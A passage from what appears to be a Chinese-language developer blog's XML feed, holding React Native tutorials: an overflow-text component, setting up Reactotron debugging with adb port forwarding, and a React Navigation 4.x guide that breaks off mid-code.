class="name">Text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        &#123;/* 隐藏节点，用于判断文字真实高度 */&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Text</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onLayout</span>=<span class="string">&#123;e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">            const &#123;height&#125; = e.nativeEvent.layout;</span></span><br><span class="line"><span class="language-xml">            if (height - 1 &lt; linHeight * numberOfLines) &#123;</span></span><br><span class="line"><span class="language-xml">              setIsOverflow(false);</span></span><br><span class="line"><span class="language-xml">            &#125; else &#123;</span></span><br><span class="line"><span class="language-xml">              setIsOverflow(true);</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          style=&#123;&#123;</span></span><br><span class="line"><span class="language-xml">            position: &#x27;absolute&#x27;,</span></span><br><span class="line"><span class="language-xml">            zIndex: -100,</span></span><br><span class="line"><span class="language-xml">            lineHeight: linHeight,</span></span><br><span class="line"><span class="language-xml">            opacity: 0,</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;&gt;</span></span><br><span class="line"><span class="language-xml">          &#123;children&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;/* 隐藏节点，用于判断文字真实高度 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;isOverflow ? (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">AntDesign</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">name</span>=<span class="string">&#123;hide</span> ? &#x27;<span class="attr">down</span>&#x27; <span class="attr">:</span> &#x27;<span class="attr">up</span>&#x27;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">size</span>=<span class="string">&#123;15&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">color</span>=<span class="string">&#123;</span>&#x27;#<span class="attr">9F9F9F</span>&#x27;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">style</span>=<span class="string">&#123;&#123;textAlign:</span> &#x27;<span class="attr">center</span>&#x27;, <span class="attr">lineHeight:</span> <span class="attr">30</span>&#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">onPress</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">            const newValue = !hide;</span></span><br><span class="line"><span class="language-xml">            setHide(newValue);</span></span><br><span class="line"><span class="language-xml">            if (typeof onChange === &#x27;function&#x27;) &#123;</span></span><br><span class="line"><span class="language-xml">              onChange(newValue);</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        /&gt;</span></span><br><span class="line"><span class="language-xml">      ) : null&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">OverflowText</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Reactotron 调试 ReactNative 应用</title>
      <link href="/2020/07/b4de7c1e8109.html"/>
      <url>/2020/07/b4de7c1e8109.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用-Reactotron-进行调试"><a href="#使用-Reactotron-进行调试" class="headerlink" title="使用 Reactotron 进行调试"></a>使用 Reactotron 进行调试</h1><p><a href="https://www.youtube.com/watch?v=UiPo9A9k7xc">Chain React 2018: Debugging and Beyond with Reactotron</a></p><p>安装 Reactotron 客户端：</p><blockquote><p><a href="https://github.com/infinitered/reactotron/releases">https://github.com/infinitered/reactotron/releases</a></p></blockquote><p>在项目中安装 Reactotron:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yarn add reactotron-react-native</span></span><br></pre></td></tr></table></figure><p>在根目录创建 <code>Reactotron.js</code> 文件，文件内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Reactotron</span> <span class="keyword">from</span> <span class="string">&#x27;reactotron-react-native&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Reactotron</span>.<span class="title function_">configure</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>, <span class="comment">// 连接真机测试必须添加该配置项</span></span><br><span class="line">&#125;)</span><br><span class="line">  .<span class="title function_">useReactNative</span>() <span class="comment">// add all built-in react native plugins</span></span><br><span class="line">  .<span class="title function_">connect</span>(); <span class="comment">// let&#x27;s connect!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>App.js</code> 或者 <code>index.js</code> 文件中对 Reactotron 脚本进行引入和调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加：</span></span><br><span class="line"><span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">  <span class="title function_">import</span>(<span class="string">&#x27;./ReactotronConfig&#x27;</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Reactotron Configured&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是使用真机进行调试，则需要调用 adb 指令进行端口转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb reverse tcp:9090 tcp:9090</span><br></pre></td></tr></table></figure><p>Tips：</p><ul><li>在运行完端口转发的指令之后，需要手动 live reload 一下应用，才能连接上 Reactotron</li><li>每次 live reload 后 Reactotron 都会生成一个新设备</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React Navigation 4.x 快速使用指南</title>
      <link href="/2020/07/93836fb6b1ba.html"/>
      <url>/2020/07/93836fb6b1ba.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-安装-React-Navigator"><a href="#0-安装-React-Navigator" class="headerlink" title="0. 安装 React Navigator"></a>0. 安装 React Navigator</h1><blockquote><p>官方文档：<a href="https://reactnavigation.org/docs/4.x/getting-started">https://reactnavigation.org/docs/4.x/getting-started</a></p></blockquote><p>安装 React Navigator</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-navigation</span><br></pre></td></tr></table></figure><h1 id="1-堆栈导航-StackNavigator"><a href="#1-堆栈导航-StackNavigator" class="headerlink" title="1. 堆栈导航 StackNavigator"></a>1. 堆栈导航 StackNavigator</h1><p>在网络浏览器中，您可以使用定位 <code>&lt;a&gt;</code> 标记链接到其他页面 。 当用户单击链接时，URL将被推送到浏览器历史记录堆栈。 当用户按下“后退”按钮时，浏览器从历史记录堆栈的顶部弹出该项目，因此活动页面现在是以前访问的页面。 React Native 不像 Web 浏览器那样具有内置的全局历史堆栈概念。</p><p>React Navigation 的堆栈导航器为您的应用程序提供了一种在屏幕之间转换和管理导航历史记录的方式。 如果您的应用仅使用一个堆栈导航器，那么它在概念上类似于 Web 浏览器处理导航状态的方式，您的应用在用户与之交互时从导航堆栈中推送和弹出项目，这导致用户看到不同的屏幕。 它在 Web 浏览器和 React Navigation 中的工作方式之间的主要区别在于，React Navigation 的堆栈导航器提供了在堆栈中的路线之间导航时在 Android 和 iOS 手势和动画。</p><p>在继续之前，请先安装 <a href="https://github.com/react-navigation/stack"><code>react-navigation-stack</code></a> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yarn add react-navigation-stack @react-native-community/masked-view react-native-safe-area-context</span></span><br></pre></td></tr></table></figure><p>创建一个 Home 页：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">StyleSheet</span>, <span class="title class_">View</span>, <span class="title class_">Text</span>, <span class="title class_">Image</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;react-native&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Home</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Text</span>&gt;</span>这是你的Home<span class="tag">&lt;/<span class="name">Text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>在 App.tsx 中可以引入该 Home 页：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;createAppContainer&#125; <span class="keyword">from</span> <span class="string">&#x27;react-navigation&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;createStackNavigator&#125; <span class="keyword">from</span> <span class="string">&#x27;react-navigation-stack&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;./src/pages/home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一步利用 createStackNavigator() 方法生成了  Navigator 对象</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AppNavigator</span> = <span class="title function_">createStackNavigator</span>(&#123;</span><br><span class="line">  <span class="title class_">Home</span>: &#123;</span><br><span class="line">    <span class="attr">screen</span>: <span class="title class_">Home</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由 Navigator 对象生成 AppContainer 组件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">AppContainer</span> = <span class="title function_">createAppContainer</span>(<span class="title class_">AppNavigator</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">AppContainer</span> /&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><code>createStackNavigator()</code> 提供了创建页面堆栈的方法，其第一个参数传的是页面的配置项，第二个参数传递的是堆栈的相关设置，如默认页面等，我们可以创建多个页面，并指定初始页面：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AppNavigator</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">Home</span>: &#123;</span><br><span class="line">      <span class="attr">screen</span>: <span class="title class_">Home</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">MovieList</span>: <span class="title class_">MovieList</span>, <span class="comment">// 可以使用简写</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">initialRouteName</span>: <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="2-页面间导航跳转"><a href="#2-页面间导航跳转" class="headerlink" title="2. 页面间导航跳转"></a>2. 页面间导航跳转</h1><p>在由 <code>createAppContainer()</code> 生成的 AppContainer 组件中，其可以向所有的子页面组件传入 props。因此，我们可以在页面组件中，通过组件 props 调用传入的 <code>navigation</code> 对象(<a href="https://reactnavigation.org/docs/4.x/navigation-prop/">API DOC</a>)，进行导航跳转：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">StyleSheet</span>, <span class="title class_">View</span>, <span class="title class_">Text</span>, <span class="title class_">Image</span>, <span class="title class_">Button</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;react-native&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> reactotron <span class="keyword">from</span> <span class="string">&#x27;reactotron-react-native&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">NavigationContainerProps</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;react-navigation&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Home</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="built_in">any</span>&gt; = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;navigation&#125;: &#123;<span class="attr">navigation</span>: <span class="title class_">NavigationStackProp</span>&#125; = props;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">View</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Text</span>&gt;</span>这是你的Home<span class="tag">&lt;/<span class="name">Text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">title</span>=<span class="string">&quot;这是你的Button&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onPress</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          // 机型页面跳转</span></span><br><span class="line"><span class="language-xml">          navigation.navigate(&#x27;MovieList&#x27;);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><blockquote><p>如果目标路由是不存在的页面（在堆栈中未定义）或者是当前页面的话，那么什么都不会发生。</p></blockquote><p>但是，有些情况我们需要在当前页面重新跳转到当前页面，从而对页面上的数据进行刷新，如果我们想要在详情页面进行路由跳转，从而改变 url params 让页面发生改变。那么此时应该使用 <code>navigation.push(&#39;MovieList&#39;)</code>，这样就会有效了。</p><p>在堆栈页面中，使用 <code>push</code> 来跳转新页面就相当于一直在堆栈中加入新页面，每次返回都是返回到堆栈的上一个页面中，这与浏览器的 History 是同一个逻辑,直到顶层页面页面调用 <code>goBack()</code> 方法无效，同时左上角没有返回按钮。</p><p>然而使用 <code>navigate</code> 即为导航到某个页面，并不会在路由堆栈中添加新页面。</p><blockquote><p>push、pop 等方法只有在堆栈导航中传入的 navigation 才存在</p></blockquote><h1 id="3-导航生命周期"><a href="#3-导航生命周期" class="headerlink" title="3. 导航生命周期"></a>3. 导航生命周期</h1><p>react 导航支持声明周期（与其说是生命周期不如说是事件监听），这些声明周期事件需要我们在组件被挂载时进行订阅，在组件被卸载时移除订阅。</p><p>例如，我们想要订阅用户离开当前界面时出发的事件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Add the listener</span></span><br><span class="line">  <span class="keyword">const</span> didBlurSubscription = navigation.<span class="title function_">addListener</span>(<span class="string">&#x27;didBlur&#x27;</span>, <span class="function">(<span class="params">payload</span>) =&gt;</span> &#123;</span><br><span class="line">    reactotron.<span class="title function_">debug</span>(<span class="string">&#x27;didBlur&#x27;</span>);</span><br><span class="line">    reactotron.<span class="title function_">log</span>(payload);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Remove the listener</span></span><br><span class="line">    reactotron.<span class="title function_">debug</span>(<span class="string">&#x27;didBlur removed&#x27;</span>);</span><br><span class="line">    didBlurSubscription.<span class="title function_">remove</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p>其中 payload 记录了路由的如下信息（我也看不懂）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;context&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id-1595004781572-19:Navigation/COMPLETE_TRANSITION_Root&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;routeName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Home&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id-1595004781572-19&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lastState&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;routeName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Home&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id-1595004781572-19&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Navigation/COMPLETE_TRANSITION&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preserveFocus&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;StackRouterRoot&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;toChildKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id-1595004781572-19&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;action&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>React Navigation 支持订阅如下事件：</p><ul><li><code>willFocus</code> 屏幕将聚焦</li><li><code>didFocus</code> 屏幕聚焦后（如果有过渡，则过渡完成）</li><li><code>willBlur</code> 前屏将离开</li><li><code>didBlur</code> 屏幕离开后（如果有过渡，则过渡完成）</li></ul><blockquote><p>您还可以使用 withNavigationFocus HOC 或 <code>&lt;NavigationEvents /&gt;</code> 组件对生命周期更改做出反应。</p></blockquote><h1 id="4-路由参数"><a href="#4-路由参数" class="headerlink" title="4. 路由参数"></a>4. 路由参数</h1><blockquote><p><a href="https://reactnavigation.org/docs/4.x/params">https://reactnavigation.org/docs/4.x/params</a></p></blockquote><p>配置参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigation.<span class="title function_">navigate</span>(<span class="string">&#x27;MovieDetail&#x27;</span>, &#123;<span class="attr">movieInfo</span>: movie&#125;);</span><br></pre></td></tr></table></figure><p>获取参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> movieInfo = navigation.<span class="title function_">getParam</span>(<span class="string">&#x27;movieInfo&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="5-配置标题栏"><a href="#5-配置标题栏" class="headerlink" title="5. 配置标题栏"></a>5. 配置标题栏</h1><blockquote><p><a href="https://reactnavigation.org/docs/4.x/headers">https://reactnavigation.org/docs/4.x/headers</a></p></blockquote><p>我们可以在创建路由导航对象时可以为路由页面设置标题，同时还可以在标题中拆入 JSX 节点：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AppNavigator</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// other screen options ... ... </span></span><br><span class="line">    <span class="title class_">MovieDetail</span>: &#123;</span><br><span class="line">      <span class="attr">screen</span>: <span class="title class_">MovieDetail</span>,</span><br><span class="line">      <span class="attr">navigationOptions</span>: &#123;</span><br><span class="line">        <span class="attr">headerTitle</span>: <span class="string">&#x27;电影详情&#x27;</span>,</span><br><span class="line">        <span class="attr">headerRight</span>: <span class="function">() =&gt;</span> (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">Button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">title</span>=<span class="string">&quot;返回首页&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">onPress</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">              alert(&#x27;无情哈拉少&#x27;);</span></span><br><span class="line"><span class="language-xml">            &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line">        ),</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// other options ... ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果我们想要在顶部按钮中使用导航对象从而控制路由，那么 <code>navigationOptions</code> 传入的应该是一个方法，从方法的参数中可以解构出导航对象：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">AppNavigator</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="title class_">MovieDetail</span>: &#123;</span><br><span class="line">      <span class="attr">screen</span>: <span class="title class_">MovieDetail</span>,</span><br><span class="line">      <span class="attr">navigationOptions</span>: <span class="function">(<span class="params">&#123;navigation&#125;</span>) =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">headerTitle</span>: <span class="string">&#x27;电影详情&#x27;</span>,</span><br><span class="line">        <span class="attr">headerRight</span>: <span class="function">() =&gt;</span> (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">Button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">title</span>=<span class="string">&quot;返回首页&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">onPress</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">              navigation.navigate(&#x27;Home&#x27;);</span></span><br><span class="line"><span class="language-xml">            &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line">        ),</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="6-全屏模式"><a href="#6-全屏模式" class="headerlink" title="6. 全屏模式"></a>6. 全屏模式</h1><blockquote><p><a href="https://reactnavigation.org/docs/4.x/modal">https://reactnavigation.org/docs/4.x/modal</a></p></blockquote><p>模态就像是一个弹出窗口，它不是您的主要导航流程的一部分，它通常具有不同的过渡，不同的消除方式，并且旨在关注某一特定的内容或交互。</p><p>React Navigation 可以实现模态框的效果，其实现原理是基于嵌套路由的。在 React Navigation 中支持嵌套路由，我们可以创建多个堆栈导航，然后将他们放在一个根级的导航堆栈中：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MovieStack</span> = <span class="title function_">createStackNavigator</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">MovieHome</span>: <span class="title class_">MovieHome</span>,</span><br><span class="line">    <span class="title class_">MovieList</span>: <span class="title class_">MovieList</span>,</span><br><span class="line">    <span class="title 